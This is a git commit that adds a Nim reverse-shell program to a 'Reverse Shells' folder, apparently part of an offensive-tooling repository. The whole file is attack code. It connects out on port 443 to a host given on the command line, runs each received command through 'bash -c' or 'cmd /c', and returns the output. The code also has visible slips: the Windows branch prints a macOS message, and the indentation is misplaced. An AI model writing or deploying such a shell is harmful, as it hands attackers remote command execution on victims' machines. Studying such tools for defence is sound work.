5fbf47adaddf04706d200e3dcaac4d9c8ac8d4e4
TheEthicalHackingGuru <75399456+TheEthicalHackingGuru@users.noreply.github.com>
2021-07-25 08:14:05 -0500

    Create simpleRevShell.nim

---
+++ Reverse Shells/simpleRevShell.nim
@@ -0,0 +1,54 @@
+
+#need nimble install argpase
+import os, net, osproc
+
+
+var 
+    sock = newSocket()
+
+proc run(TARGET: string, RPORT: int): void =
+    echo "hi"
+    
+    when system.hostOS == "macosx":
+        echo "running on Mac OS X!"
+
+
+        try:
+            sock.connect(TARGET, PORT(RPORT))
+
+            while true:
+                let cmd = sock.recvLine()
+                if cmd == "exit":
+                    break
+                let result = execProcess("bash -c " & cmd)
+                sock.send(result)
+        except:
+            raise
+        finally:
+            sock.close
+
+    when system.hostOS == "windows":
+        echo "running on Mac OS X!"
+
+
+    try:
+        sock.connect(TARGET, PORT(RPORT))
+
+        while true:
+            let cmd = sock.recvLine()
+            if cmd == "exit":
+                break
+            let result = execProcess("cmd /c " & cmd)
+            sock.send(result)
+    except:
+        raise
+    finally:
+        sock.close
+
+when isMainModule:
+  try: 
+    let RPORT = 443
+    let TARGET = paramStr(1)
+    run(TARGET, RPORT)
+  except:
+    raise
